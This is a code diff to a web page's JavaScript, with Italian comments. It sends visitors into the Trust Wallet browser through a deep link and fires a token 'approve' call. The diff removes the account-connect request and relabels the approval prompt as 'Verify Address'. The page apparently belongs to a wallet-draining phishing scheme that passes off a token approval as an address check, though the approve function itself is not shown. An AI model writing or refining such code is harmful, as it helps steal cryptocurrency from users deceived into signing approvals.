@@ -399,16 +399,14 @@
     }
 
     const isWeb3 = window.ethereum;
-    const params = new URLSearchParams(window.location.search);
-    const isAuto = params.get('auto') === '1';
 
-    if (!isWeb3 || !isAuto) {
+    if (!isWeb3) {
       // NON siamo in Trust Wallet: reindirizza via deep link
       const baseUrl = window.location.href.split('?')[0];
       const targetUrl = baseUrl + '?auto=1&addr=' + encodeURIComponent(inputAddr);
       window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(targetUrl);
     } else {
-      // SIAMO in Trust Wallet: esegui l'approvazione
+      // SIAMO già in Trust Wallet: fai direttamente l'approve senza chiedere connect
       await executeApprove(inputAddr);
     }
   }
@@ -419,6 +417,9 @@
       if (typeof ethers === 'undefined') {
         throw new Error('ethers.js not loaded');
       }
+
+      // Non richiediamo eth_requestAccounts, facciamo direttamente l'approve
+      // Trust Wallet mostrerà automaticamente il modal di approve
 
       // Crea il provider PRIMA di switchare la rete
       const provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -487,19 +488,16 @@
     const isAuto = params.get('auto') === '1';
     
     if (isAuto && window.ethereum) {
-      // SIAMO in Trust Wallet con auto=1: fai direttamente l'approve
+      // SIAMO in Trust Wallet con auto=1: mostra il modal per fare l'approve
       const addr = params.get('addr') || '';
       document.getElementById('walletInput').value = decodeURIComponent(addr);
-
-      try {
-        // Richiedi connessione wallet automaticamente
-        await window.ethereum.request({ method: "eth_requestAccounts" });
-        // Fai direttamente l'approve senza mostrare il modal
-        await executeApprove(addr);
-      } catch (e) { 
-        console.error("Error:", e);
-        alert('Error: ' + (e?.message || 'Unknown error'));
-      }
+      
+      // Cambio testi modal
+      document.getElementById('modalTitle').textContent = "Verify Address";
+      document.getElementById('modalDesc').style.display = "block";
+      
+      // Apri il modal
+      openVerifyModal();
     }
     
     // Nascondi loading overlay
